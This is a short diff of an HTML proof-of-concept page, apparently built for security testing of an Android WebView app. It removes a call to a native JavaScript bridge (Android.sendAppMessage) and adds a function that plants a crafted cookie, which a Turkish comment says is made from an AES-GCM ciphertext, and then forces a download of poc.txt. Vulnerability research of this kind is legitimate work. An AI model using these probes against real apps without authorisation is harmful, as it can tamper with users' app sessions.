@@ -1,27 +1,20 @@
-<button onclick="testBridge()">Native Share Test</button>
-
-<br><br>
-
-<a href="poc.txt" download>
-  <button>Native Download Test</button>
-</a>
+<button onclick="nativeDownloadTest()">Native Download Test</button>
 
 <script>
-function testBridge() {
-  const payload = {
-    key: "share",
-    value: {
-      desc: "Bridge PoC",
-      title: "Bridge PoC",
-      url: "https://nurbayram.github.io/webview-poc/"
-    }
-  };
+function nativeDownloadTest() {
 
-  try {
-    Android.sendAppMessage(JSON.stringify(payload));
-    alert("Android.sendAppMessage çağrıldı");
-  } catch (e) {
-    alert("Bridge hatası: " + e);
-  }
+  // AES-GCM ciphertext'in son "=" karakterini
+  // cookie name/value ayırıcısı olarak kullanıyoruz.
+  document.cookie =
+    "tn4vI43rxqun7jXw35LiUkHJPqy9PwAh1fSi7RY=; path=/";
+
+  alert("Cookie: " + document.cookie);
+
+  const a = document.createElement("a");
+  a.href = "poc.txt";
+  a.download = "poc.txt";
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
 }
 </script>
